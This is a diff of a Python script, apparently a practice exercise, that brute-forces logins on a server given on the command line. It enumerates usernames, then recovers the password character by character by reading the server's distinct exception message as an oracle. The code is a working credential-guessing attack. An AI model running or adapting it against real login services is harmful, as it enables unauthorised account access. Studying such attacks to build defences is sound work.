@@ -21,26 +21,31 @@ def login_generator():
 
 with socket.socket() as ssocket:
 
-    args = sys.argv                             # list of command line arguments
+    args = sys.argv                             # list of arguments from command line
     address_and_port = (args[1], int(args[2]))
     ssocket.connect(address_and_port)
     srecv = ""
+    good_pass = ""
 
-    for login_gen in login_generator():
-        json_message = "{ 'login' : '" + login_gen + "', 'password' : ' ' }"
+    for login_gen in login_generator():     # first check for username vulnerability.
+        json_message = '{ "login" : "' + login_gen + '", "password" : " " }'
 
-        try:
-            ssocket.send(json.dumps(json_message).encode('utf8'))
-            srecv = ssocket.recv(1024).decode('utf8')
-
-        except:
-            print(json_message)
-            exit()
-        o = open("from_open.txt", "a")
-        o.write(json_message + "..." + srecv + "\n")
-        o.close()
-
-        if srecv == '{    "result": "Connection success!"}':
+        ssocket.send(json_message.encode('utf8'))
+        srecv = ssocket.recv(1024).decode('utf8')
+        
+        if json.loads(srecv)["result"] == "Wrong password!":
             break
 
-print(json_message)
+    for _ in range(10):     # bruteforce for password after username solved
+        for char in abc:
+            json_message = '{ "login" : "' + login_gen + '", "password" : "' + good_pass + char + '" }'
+
+            ssocket.send(json_message.encode('utf8'))
+            srecv = ssocket.recv(1024).decode('utf8')
+
+            if json.loads(srecv)["result"] == "Exception happened during login":
+                good_pass += char
+
+            if json.loads(srecv)["result"] == "Connection success!":
+                print('{"login": "' + login_gen + '", "password": "' + good_pass + char + '"}')
+                exit()
